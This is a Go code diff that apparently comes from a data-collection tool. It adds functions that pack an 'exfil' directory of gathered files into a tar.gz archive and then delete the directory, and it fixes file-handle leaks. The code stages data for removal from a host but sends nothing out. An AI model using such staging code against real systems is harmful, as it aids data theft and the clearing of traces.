@@ -1,10 +1,13 @@
 package internals
 
 import (
+	"archive/tar"
+	"compress/gzip"
 	"fmt"
 	"io"
 	"os"
 	"strings"
+	"path/filepath"
 )
 
 // Function checks to see if our full path to the exfil directory already exists, if it does the program will warn
@@ -50,7 +53,6 @@ func GetExfilDirectory() string {
 		// errors printed in above function, not needed here
 		os.Exit(3)
 	}
-
 	err = os.Mkdir(pwd+"/"+exfilDirectory, 0755)
 	if err != nil {
 		fmt.Println("[!] Failed to create exfil directory")
@@ -113,13 +115,81 @@ func CopyFiles(toCollect []string, exfilDirectory string) {
 			fmt.Println("[!] Error creating file", exfilDirectory+file)
 			fmt.Println("\tError Returned:", err)
 			// pass onto the next file in the array 
+			sourceFile.Close()
 			continue
 		}
 		_, err = io.Copy(destFile, sourceFile)
 		if err != nil {
 			fmt.Println("[!] Error copying file", sourceFile, "->", destFile)
 			fmt.Println("\tError Returned:", err)
+			sourceFile.Close()
+			destFile.Close()
 			continue
 		}
+		sourceFile.Close()
+		destFile.Close()
 	}
+}
+
+func TarGzipDirectory(exfilDirectory string) error {
+	tarGzipFile, err := os.Create("exdata.tar.gz")
+	if err != nil {
+		return err
+	}
+	defer tarGzipFile.Close()
+	
+	gzipWriter := gzip.NewWriter(tarGzipFile)
+	defer gzipWriter.Close()
+
+	tarWriter := tar.NewWriter(gzipWriter)
+	defer tarWriter.Close()
+
+	err = filepath.Walk(exfilDirectory, func(filePath string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		// Open the file if it's not a directory
+		if !info.IsDir() {
+			// Create a tar header for the file
+			header, err := tar.FileInfoHeader(info, "")
+			if err != nil {
+				return err
+			}
+
+			// Update the header name to store relative paths in the tar file
+			relPath, err := filepath.Rel(exfilDirectory, filePath)
+			if err != nil {
+				return err
+			}
+			header.Name = relPath
+
+			// Write the header to the tar archive
+			err = tarWriter.WriteHeader(header)
+			if err != nil {
+				return err
+			}
+
+			// Open the file and copy its contents to the tar file
+			file, err := os.Open(filePath)
+			if err != nil {
+				return err
+			}
+			defer file.Close()
+
+			_, err = io.Copy(tarWriter, file)
+			if err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+
+	return err
+
+}
+
+func RemoveRecursive(directory string) error {
+	err := os.RemoveAll(directory)
+	return err
 }
